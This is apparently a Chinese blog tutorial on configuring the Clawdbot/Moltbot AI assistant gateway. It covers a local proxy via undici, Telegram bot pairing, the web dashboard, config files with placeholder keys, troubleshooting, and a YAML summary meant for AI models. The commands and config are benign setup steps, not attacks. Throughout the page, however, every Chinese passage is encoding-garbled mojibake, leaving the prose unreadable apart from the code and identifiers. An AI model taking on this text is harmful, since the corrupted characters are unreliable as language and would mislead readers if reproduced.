<p>æˆåŠŸå¯åŠ¨åä¼šçœ‹åˆ°ï¼š</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-selector-attr">[ä»£ç†]</span> å·²è®¾ç½®å…¨å±€ä»£ç†: <span class="hljs-selector-tag">http</span>:<span class="hljs-comment">//127.0.0.1:1087</span>
ğŸ¦ <span class="hljs-selector-tag">Clawdbot</span> <span class="hljs-number">2026.1</span><span class="hljs-selector-class">.24-3</span>
<span class="hljs-selector-attr">[gateway]</span> æ­£åœ¨ç›‘å¬ <span class="hljs-selector-tag">ws</span>:<span class="hljs-comment">//127.0.0.1:18789</span>
<span class="hljs-selector-attr">[telegram]</span> <span class="hljs-selector-attr">[default]</span> æ­£åœ¨å¯åŠ¨...
<span class="hljs-selector-attr">[telegram]</span> <span class="hljs-selector-attr">[default]</span> å¯åŠ¨æˆåŠŸ (@ä½ çš„æœºå™¨äººå)
</code></pre>

<p>æœ‰è¿™ä¸ªçº¢æ¡†è¡¨ç¤ºtelegramä¹ŸæˆåŠŸè¿æ¥</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3eaa8757d38e40df93fa345d9597701f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeWV6YW5ubm5ubg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770370826&amp;x-signature=ClVetGDsnx8DMK8y5yw3gD8BcWo%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-15">3.3 éªŒè¯ä»£ç†æ˜¯å¦ç”Ÿæ•ˆ</h4>
<p>æµ‹è¯• Telegram API è¿æ¥ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">curl -x http://127.0.0.1:1087 https://api.telegram.org/botä½ çš„TOKEN/getMe
</code></pre>
<p>å¦‚æœè¿”å›æœºå™¨äººä¿¡æ¯ï¼Œè¯´æ˜ä»£ç†é…ç½®æ­£ç¡®ã€‚</p>
<hr/>
<h3 data-id="heading-16">å››ã€Telegram æœºå™¨äººé…ç½®</h3>
<h4 data-id="heading-17">4.1 åˆ›å»º Telegram æœºå™¨äºº</h4>
<ol>
<li>åœ¨ Telegram æœç´¢ <strong>@BotFather</strong></li>
<li>å‘é€ <code>/newbot</code></li>
<li>æŒ‰æç¤ºè®¾ç½®æœºå™¨äººåç§°å’Œç”¨æˆ·å</li>
<li>è·å–æœºå™¨äºº Tokenï¼ˆæ ¼å¼ç±»ä¼¼ <code>123456789:ABCdefGHIjklMNOpqrsTUVwxyz</code>ï¼‰</li>
</ol>
<h4 data-id="heading-18">4.2 é…ç½® Clawdbot</h4>
<p>åœ¨ <code>~/.clawdbot/clawdbot.json</code> ä¸­æ·»åŠ  Telegram é…ç½®ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"channels"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"telegram"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"enabled"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"dmPolicy"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"pairing"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"botToken"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ä½ çš„æœºå™¨äººToken"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"groupPolicy"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"allowlist"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"streamMode"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"partial"</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h4 data-id="heading-19">4.3 é…å¯¹ä½ çš„ Telegram è´¦å·</h4>
<ol>
<li>ä½¿ç”¨ä»£ç†å¯åŠ¨ Gatewayï¼š</li>
</ol>
<pre><code class="hljs language-bash" lang="bash">~/start-clawdbot.sh
</code></pre>
<ol start="2">
<li>
<p>åœ¨ Telegram ç»™ä½ çš„æœºå™¨äººå‘é€ä»»æ„æ¶ˆæ¯</p>
</li>
<li>
<p>æœºå™¨äººä¼šå›å¤é…å¯¹ç ï¼š</p>
</li>
</ol>

<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">Clawdbot: è®¿é—®æœªé…ç½®</span>

ä½ çš„ Telegram ç”¨æˆ· ID: 123456789
<span class="hljs-section">é…å¯¹ç : ABC12345</span>

è¯·æœºå™¨äººç®¡ç†å‘˜æ‰§è¡Œä»¥ä¸‹å‘½ä»¤æ‰¹å‡†ï¼š
clawdbot pairing approve telegram ABC12345

</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5597b49de3f347329f1787d65d5b9469~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeWV6YW5ubm5ubg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770370826&amp;x-signature=6sRdy%2BYzIZO%2FtQVpY7XaAteSL1E%3D" alt="image.png" loading="lazy"/></p>
<ol start="4">
<li>åœ¨ç»ˆç«¯æ‰§è¡Œæ‰¹å‡†å‘½ä»¤ï¼š</li>
</ol>
<pre><code class="hljs language-bash" lang="bash">clawdbot pairing approve telegram ABC12345
</code></pre>
<ol start="5">
<li>é…å¯¹æˆåŠŸåå³å¯æ­£å¸¸å¯¹è¯</li>
</ol>

<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4b4fd1fef8da496680e68df3afaa25b4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeWV6YW5ubm5ubg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770370826&amp;x-signature=uRAGH9BIbYm29iGyuqqOPcLDSZI%3D" alt="image.png" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-20">äº”ã€Web æ§åˆ¶é¢æ¿</h3>
<p>Clawdbot æä¾›äº†ä¸€ä¸ªåŠŸèƒ½ä¸°å¯Œçš„ Web æ§åˆ¶é¢æ¿ã€‚</p>
<h4 data-id="heading-21">5.1 è®¿é—®åœ°å€</h4>
<p>Gateway å¯åŠ¨åï¼Œè®¿é—®ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">http://127.0.0.1:18789/?<span class="hljs-attr">token</span>=ä½ çš„gateway_token
</code></pre>
<p>æˆ–è€…ä½¿ç”¨å‘½ä»¤è‡ªåŠ¨æ‰“å¼€ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">clawdbot dashboard
</code></pre>
<h4 data-id="heading-22">5.2 ä¸»è¦åŠŸèƒ½</h4>
<ul>
<li><strong>ğŸ’¬ å¯¹è¯</strong>ï¼šç›´æ¥ä¸ AI å¯¹è¯</li>
<li><strong>ğŸ“Š æ¦‚è§ˆ</strong>ï¼šæŸ¥çœ‹ç³»ç»ŸçŠ¶æ€</li>
<li><strong>ğŸ”Œ é¢‘é“</strong>ï¼šç®¡ç† Telegram/WhatsApp ç­‰è¿æ¥</li>
<li><strong>ğŸ“ ä¼šè¯</strong>ï¼šæŸ¥çœ‹å’Œç®¡ç†å¯¹è¯å†å²</li>
<li><strong>âš™ï¸ é…ç½®</strong>ï¼šä¿®æ”¹å„é¡¹è®¾ç½®</li>
</ul>
<p>ç¬”è€…è®©ä»–å¸®å¿™ç¼–å†™è¿™ç¯‡æ–‡æ¡£</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2ece21d89f564b629c84877c8d5b72d2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeWV6YW5ubm5ubg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770370826&amp;x-signature=gz1pbYCZC1eAM4O3SF8gCRFctI8%3D" alt="image.png" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-23">å…­ã€å®Œæ•´é…ç½®æ–‡ä»¶å‚è€ƒ</h3>
<h4 data-id="heading-24">6.1 ä¸»é…ç½®æ–‡ä»¶ <code>~/.clawdbot/clawdbot.json</code></h4>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"meta"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"lastTouchedVersion"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"2026.1.24-3"</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"models"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"providers"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"anthropic"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"baseUrl"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"https://ä½ çš„ä»£ç†åœ°å€.com"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"apiKey"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ä½ çš„APIå¯†é’¥"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"api"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"anthropic-messages"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"models"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"agents"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"defaults"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"workspace"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"/Users/ä½ çš„ç”¨æˆ·å/clawd"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"model"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"primary"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"anthropic/claude-sonnet-4-5-20250929"</span>
      <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"compaction"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"mode"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"safeguard"</span>
      <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"maxConcurrent"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">4</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"channels"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"telegram"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"enabled"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"dmPolicy"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"pairing"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"botToken"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ä½ çš„æœºå™¨äººToken"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"groupPolicy"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"allowlist"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"streamMode"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"partial"</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"gateway"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"port"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">18789</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"mode"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"local"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"bind"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"loopback"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"auth"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"mode"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"token"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"token"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ä½ çš„gateway_token"</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h4 data-id="heading-25">6.2 è®¤è¯é…ç½®æ–‡ä»¶</h4>
<p><code>~/.clawdbot/agents/main/agent/auth-profiles.json</code></p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"version"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"profiles"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"anthropic:default"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"api_key"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"provider"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"anthropic"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"apiKey"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ä½ çš„APIå¯†é’¥"</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<hr/>
<h3 data-id="heading-26">ä¸ƒã€å¸¸è§é—®é¢˜æ’æŸ¥</h3>
<h4 data-id="heading-27">7.1 HTTP 403 é”™è¯¯</h4>
<p><strong>å¯èƒ½åŸå› ï¼š</strong></p>
<ul>
<li>ç¼ºå°‘ <code>api: "anthropic-messages"</code> é…ç½®</li>
<li>ç¼ºå°‘ <code>models: []</code> å­—æ®µ</li>
<li>API å¯†é’¥æ— æ•ˆæˆ–ä½™é¢ä¸è¶³</li>
</ul>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong>
æ£€æŸ¥é…ç½®æ–‡ä»¶æ ¼å¼ï¼Œç¡®ä¿åŒ…å«æ‰€æœ‰å¿…éœ€å­—æ®µã€‚</p>
<h4 data-id="heading-28">7.2 Telegram è¿æ¥å¤±è´¥</h4>
<p><strong>é”™è¯¯ä¿¡æ¯ï¼š</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">TypeError</span>: fetch failed
</code></pre>
<p><strong>å¯èƒ½åŸå› ï¼š</strong></p>
<ul>
<li>ä»£ç†æœªæ­£ç¡®é…ç½®</li>
<li>Node.js çš„ç½‘ç»œè¯·æ±‚æ²¡æœ‰èµ°ä»£ç†</li>
</ul>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong>
ä½¿ç”¨ undici ä»£ç†æ–¹æ¡ˆï¼ˆè§ç¬¬ä¸‰èŠ‚ï¼‰ã€‚</p>
<h4 data-id="heading-29">7.3 Gateway å¯åŠ¨ä½†æ— å“åº”</h4>
<p><strong>æ£€æŸ¥æ­¥éª¤ï¼š</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æŸ¥çœ‹çŠ¶æ€</span>
clawdbot status

<span class="hljs-comment"># æŸ¥çœ‹æ—¥å¿—</span>
<span class="hljs-built_in">tail</span> -f /tmp/clawdbot/clawdbot-$(<span class="hljs-built_in">date</span> +%Y-%m-%d).<span class="hljs-built_in">log</span>
</code></pre>
<h4 data-id="heading-30">7.4 é…å¯¹ç ä¸æ˜¾ç¤º</h4>
<p><strong>å¯èƒ½åŸå› ï¼š</strong></p>
<ul>
<li>Telegram æœºå™¨äºº Token æ— æ•ˆ</li>
<li>ä»£ç†è¿æ¥ä¸ç¨³å®š</li>
</ul>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong></p>
<ol>
<li>éªŒè¯ Tokenï¼š<code>curl -x http://127.0.0.1:1087 https://api.telegram.org/botä½ çš„TOKEN/getMe</code></li>
<li>æ£€æŸ¥ä»£ç†è¿æ¥æ˜¯å¦æ­£å¸¸</li>
</ol>
<hr/>
<h3 data-id="heading-31">å…«ã€å¸¸ç”¨å‘½ä»¤é€ŸæŸ¥</h3>













































<table><thead><tr><th>å‘½ä»¤</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>clawdbot status</code></td><td>æŸ¥çœ‹çŠ¶æ€</td></tr><tr><td><code>clawdbot status --deep</code></td><td>æŸ¥çœ‹è¯¦ç»†çŠ¶æ€</td></tr><tr><td><code>clawdbot models status</code></td><td>æŸ¥çœ‹æ¨¡å‹çŠ¶æ€</td></tr><tr><td><code>clawdbot logs --follow</code></td><td>å®æ—¶æŸ¥çœ‹æ—¥å¿—</td></tr><tr><td><code>clawdbot gateway restart</code></td><td>é‡å¯ç½‘å…³</td></tr><tr><td><code>clawdbot configure</code></td><td>é…ç½®å‘å¯¼</td></tr><tr><td><code>clawdbot doctor</code></td><td>è¯Šæ–­é—®é¢˜</td></tr><tr><td><code>clawdbot dashboard</code></td><td>æ‰“å¼€æ§åˆ¶é¢æ¿</td></tr><tr><td><code>clawdbot pairing approve telegram &lt;ç &gt;</code></td><td>æ‰¹å‡†é…å¯¹</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-32">ä¹ã€æ€»ç»“</h3>
<p>åœ¨ç‰¹æ®Šç½‘ç»œç¯å¢ƒä¸‹é…ç½® Clawdbot çš„ä¸»è¦æŒ‘æˆ˜ï¼š</p>
<ol>
<li><strong>ä»£ç†é…ç½®å¤æ‚</strong>ï¼šNode.js 22 çš„ç½‘ç»œè¯·æ±‚ä¸è¯»å–ç¯å¢ƒå˜é‡ä»£ç†ï¼Œéœ€è¦ä½¿ç”¨ undici æ–¹æ¡ˆ</li>
<li><strong>é…ç½®æ ¼å¼ä¸¥æ ¼</strong>ï¼š<code>api</code> å’Œ <code>models</code> å­—æ®µç¼ºä¸€ä¸å¯ï¼Œå¦åˆ™ä¼šæŠ¥ 403 é”™è¯¯</li>
<li><strong>å¤šä¸ªé…ç½®æ–‡ä»¶</strong>ï¼šä¸»é…ç½®å’Œè®¤è¯é…ç½®éœ€è¦åŒæ—¶æ­£ç¡®è®¾ç½®</li>
</ol>
<p><strong>æ¨èæ–¹æ¡ˆï¼š</strong></p>
<ul>
<li>ä½¿ç”¨ API ä»£ç†æœåŠ¡è·å–ç¨³å®šçš„ API è®¿é—®</li>
<li>ä½¿ç”¨ undici + å¯åŠ¨è„šæœ¬é…ç½®å…¨å±€ä»£ç†</li>
<li>ä¿ç•™é…ç½®å¤‡ä»½ï¼Œæ–¹ä¾¿å‡ºé—®é¢˜æ—¶æ¢å¤</li>
</ul>
<hr/>
<h3 data-id="heading-33">å‚è€ƒèµ„æº</h3>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.molt.bot%2F" target="_blank" title="https://docs.molt.bot/" ref="nofollow noopener noreferrer">Moltbot å®˜æ–¹æ–‡æ¡£</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fmoltbot%2Fmoltbot" target="_blank" title="https://github.com/moltbot/moltbot" ref="nofollow noopener noreferrer">Moltbot GitHub ä»“åº“</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fxianyu110%2Fclawbot" target="_blank" title="https://github.com/xianyu110/clawbot" ref="nofollow noopener noreferrer">é…ç½®æŒ‡å—å‚è€ƒ</a></li>
</ul>
<hr/>
<h3 data-id="heading-34">æ–‡ä»¶ç»“æ„é€ŸæŸ¥</h3>
<pre><code class="hljs language-bash" lang="bash">~/.clawdbot/
â”œâ”€â”€ clawdbot.json                    <span class="hljs-comment"># ä¸»é…ç½®</span>
â”œâ”€â”€ logs/                            <span class="hljs-comment"># æ—¥å¿—ç›®å½•</span>
â”‚   â”œâ”€â”€ gateway.log
â”‚   â””â”€â”€ gateway.err.log
â””â”€â”€ agents/
    â””â”€â”€ main/
        â”œâ”€â”€ agent/
        â”‚   â””â”€â”€ auth-profiles.json   <span class="hljs-comment"># è®¤è¯é…ç½®</span>
        â””â”€â”€ sessions/                <span class="hljs-comment"># ä¼šè¯å­˜å‚¨</span>

~/
â”œâ”€â”€ proxy-setup.js                   <span class="hljs-comment"># ä»£ç†é…ç½®è„šæœ¬</span>
â””â”€â”€ start-clawdbot.sh               <span class="hljs-comment"># å¯åŠ¨è„šæœ¬</span>
</code></pre>
<hr/>
<hr/>
<h3 data-id="heading-35">é™„å½•ï¼šLLMæ‘˜è¦</h3>
<blockquote>
<p>ä»¥ä¸‹æ˜¯æœ¬æ–‡çš„ç»“æ„åŒ–æ‘˜è¦ï¼Œæ–¹ä¾¿å–‚ç»™å…¶ä»– AI æ¨¡å‹å¿«é€Ÿç†è§£ï¼ŒèŠ‚çœ token æ¶ˆè€—ã€‚</p>
</blockquote>
<p>yaml</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># Clawdbot/Moltbot é…ç½®çŸ¥è¯†å¡ç‰‡</span>
<span class="hljs-comment"># ç”Ÿæˆæ—¶é—´: 2026-01</span>
<span class="hljs-comment"># ç”¨é€”: ä¾›AIæ¨¡å‹å¿«é€Ÿç†è§£æœ¬æ–‡æ ¸å¿ƒå†…å®¹</span>

<span class="hljs-attr">meta:</span>
  <span class="hljs-attr">project:</span> <span class="hljs-string">Clawdbot</span> <span class="hljs-string">(å·²æ›´å</span> <span class="hljs-string">Moltbot)</span>
  <span class="hljs-attr">repo:</span> <span class="hljs-string">https://github.com/moltbot/moltbot</span>
  <span class="hljs-attr">docs:</span> <span class="hljs-string">https://docs.molt.bot/</span>
  <span class="hljs-string">åŠŸèƒ½:</span> <span class="hljs-string">æœ¬åœ°AIåŠ©æ‰‹ï¼Œæ”¯æŒTelegram/WhatsApp/Discordæ¥å…¥Claudeæ¨¡å‹</span>

<span class="hljs-string">ç¯å¢ƒè¦æ±‚:</span>
  <span class="hljs-attr">os:</span> <span class="hljs-string">macOS/Linux</span>
  <span class="hljs-attr">node:</span> <span class="hljs-string">"&gt;=22.0.0"</span>
  <span class="hljs-string">å®‰è£…:</span> <span class="hljs-string">npm</span> <span class="hljs-string">install</span> <span class="hljs-string">-g</span> <span class="hljs-string">clawdbot</span>
  <span class="hljs-string">åˆå§‹åŒ–:</span> <span class="hljs-string">clawdbot</span> <span class="hljs-string">onboard</span>

<span class="hljs-string">é…ç½®æ–‡ä»¶:</span>
  <span class="hljs-string">ä¸»é…ç½®:</span> <span class="hljs-string">~/.clawdbot/clawdbot.json</span>
  <span class="hljs-string">è®¤è¯é…ç½®:</span> <span class="hljs-string">~/.clawdbot/agents/main/agent/auth-profiles.json</span>

<span class="hljs-string">APIä»£ç†é…ç½®:</span>
  <span class="hljs-string">ä½ç½®:</span> <span class="hljs-string">clawdbot.json</span> <span class="hljs-string">-&gt;</span> <span class="hljs-string">models.providers.anthropic</span>
  <span class="hljs-string">å¿…éœ€å­—æ®µ:</span>
    <span class="hljs-attr">baseUrl:</span> <span class="hljs-string">"APIä»£ç†åœ°å€"</span>
    <span class="hljs-attr">apiKey:</span> <span class="hljs-string">"å¯†é’¥"</span>
    <span class="hljs-attr">api:</span> <span class="hljs-string">"anthropic-messages"</span>  <span class="hljs-comment"># å…³é”®ï¼ç¼ºå°‘æŠ¥403</span>
    <span class="hljs-attr">models:</span> []  <span class="hljs-comment"># å…³é”®ï¼å¿…é¡»å­˜åœ¨ï¼Œå¯ä¸ºç©ºæ•°ç»„</span>
  <span class="hljs-string">ç¤ºä¾‹:</span> <span class="hljs-string">|
    {"models":{"providers":{"anthropic":{
      "baseUrl":"https://proxy.example.com",
      "apiKey":"sk-xxx",
      "api":"anthropic-messages",
      "models":[]
    }}}}
</span>
<span class="hljs-string">è®¤è¯é…ç½®:</span>
  <span class="hljs-string">ä½ç½®:</span> <span class="hljs-string">auth-profiles.json</span>
  <span class="hljs-string">æ ¼å¼:</span> <span class="hljs-string">|
    {"version":1,"profiles":{"anthropic:default":{
      "type":"api_key","provider":"anthropic","apiKey":"sk-xxx"
    }}}
</span>
<span class="hljs-string">ç½‘ç»œä»£ç†é—®é¢˜:</span>
  <span class="hljs-string">ç—‡çŠ¶:</span> <span class="hljs-string">Telegramè¿æ¥å¤±è´¥ï¼Œfetch</span> <span class="hljs-string">failed</span>
  <span class="hljs-string">åŸå› :</span> <span class="hljs-string">Node.js</span> <span class="hljs-number">22</span> <span class="hljs-string">çš„</span> <span class="hljs-string">fetch</span> <span class="hljs-string">ä¸è¯»å–</span> <span class="hljs-string">HTTP_PROXY</span> <span class="hljs-string">ç¯å¢ƒå˜é‡</span>
  <span class="hljs-string">é”™è¯¯æ–¹å¼:</span> <span class="hljs-string">export</span> <span class="hljs-string">HTTP_PROXY=...</span> <span class="hljs-string">æ— æ•ˆ</span>
  <span class="hljs-string">æ­£ç¡®æ–¹æ¡ˆ:</span>
    <span class="hljs-string">1_å®‰è£…:</span> <span class="hljs-string">npm</span> <span class="hljs-string">install</span> <span class="hljs-string">-g</span> <span class="hljs-string">undici</span>
    <span class="hljs-string">2_åˆ›å»ºè„šæœ¬:</span> <span class="hljs-string">|
      # ~/proxy-setup.js
      const {setGlobalDispatcher,ProxyAgent}=require('undici');
      setGlobalDispatcher(new ProxyAgent('http://127.0.0.1:ç«¯å£'));
</span>    <span class="hljs-string">3_å¯åŠ¨å‘½ä»¤:</span> <span class="hljs-string">|
      NODE_PATH=$(npm root -g) node --require ~/proxy-setup.js $(which clawdbot) gateway --port 18789
</span>
<span class="hljs-string">Telegramé…ç½®:</span>
  <span class="hljs-string">é…ç½®ä½ç½®:</span> <span class="hljs-string">clawdbot.json</span> <span class="hljs-string">-&gt;</span> <span class="hljs-string">channels.telegram</span>
  <span class="hljs-string">å¿…éœ€å­—æ®µ:</span> {<span class="hljs-string">enabled:true</span>, <span class="hljs-string">botToken:"xxx"</span>, <span class="hljs-string">dmPolicy:"pairing"</span>}
  <span class="hljs-string">é…å¯¹æµç¨‹:</span>
    <span class="hljs-attr">1:</span> <span class="hljs-string">é€šè¿‡@BotFatheråˆ›å»ºæœºå™¨äººè·å–token</span>
    <span class="hljs-attr">2:</span> <span class="hljs-string">é…ç½®clawdbot.json</span>
    <span class="hljs-attr">3:</span> <span class="hljs-string">å¯åŠ¨gateway</span>
    <span class="hljs-attr">4:</span> <span class="hljs-string">Telegramå‘æ¶ˆæ¯ç»™bot</span>
    <span class="hljs-attr">5:</span> <span class="hljs-string">è·å–é…å¯¹ç </span>
    <span class="hljs-attr">6:</span> <span class="hljs-string">æ‰§è¡Œ</span> <span class="hljs-string">clawdbot</span> <span class="hljs-string">pairing</span> <span class="hljs-string">approve</span> <span class="hljs-string">telegram</span> <span class="hljs-string">&lt;é…å¯¹ç &gt;</span>

<span class="hljs-string">Webæ§åˆ¶å°:</span>
  <span class="hljs-string">åœ°å€:</span> <span class="hljs-string">http://127.0.0.1:18789/?token=&lt;gateway_token&gt;</span>
  <span class="hljs-string">å‘½ä»¤:</span> <span class="hljs-string">clawdbot</span> <span class="hljs-string">dashboard</span>

<span class="hljs-string">å¸¸è§é”™è¯¯:</span>
  <span class="hljs-attr">HTTP_403:</span>
    <span class="hljs-string">åŸå› :</span> [<span class="hljs-string">ç¼ºå°‘apiå­—æ®µ</span>, <span class="hljs-string">ç¼ºå°‘modelså­—æ®µ</span>, <span class="hljs-string">apiKeyæ— æ•ˆ</span>]
    <span class="hljs-string">è§£å†³:</span> <span class="hljs-string">æ£€æŸ¥é…ç½®æ–‡ä»¶æ ¼å¼</span>
  <span class="hljs-attr">fetch_failed:</span>
    <span class="hljs-string">åŸå› :</span> <span class="hljs-string">ä»£ç†æœªç”Ÿæ•ˆ</span>
    <span class="hljs-string">è§£å†³:</span> <span class="hljs-string">ä½¿ç”¨undiciæ–¹æ¡ˆ</span>
  <span class="hljs-string">é…å¯¹ç ä¸æ˜¾ç¤º:</span>
    <span class="hljs-string">åŸå› :</span> [<span class="hljs-string">botTokenæ— æ•ˆ</span>, <span class="hljs-string">ä»£ç†ä¸ç¨³å®š</span>]
    <span class="hljs-string">è§£å†³:</span> <span class="hljs-string">curlæµ‹è¯•Telegram</span> <span class="hljs-string">API</span>

<span class="hljs-string">å‘½ä»¤é€ŸæŸ¥:</span>
  <span class="hljs-string">çŠ¶æ€:</span> <span class="hljs-string">clawdbot</span> <span class="hljs-string">status</span> [<span class="hljs-string">--deep</span>]
  <span class="hljs-string">æ—¥å¿—:</span> <span class="hljs-string">clawdbot</span> <span class="hljs-string">logs</span> <span class="hljs-string">--follow</span>
  <span class="hljs-string">é‡å¯:</span> <span class="hljs-string">clawdbot</span> <span class="hljs-string">gateway</span> <span class="hljs-string">restart</span>
  <span class="hljs-string">è¯Šæ–­:</span> <span class="hljs-string">clawdbot</span> <span class="hljs-string">doctor</span>
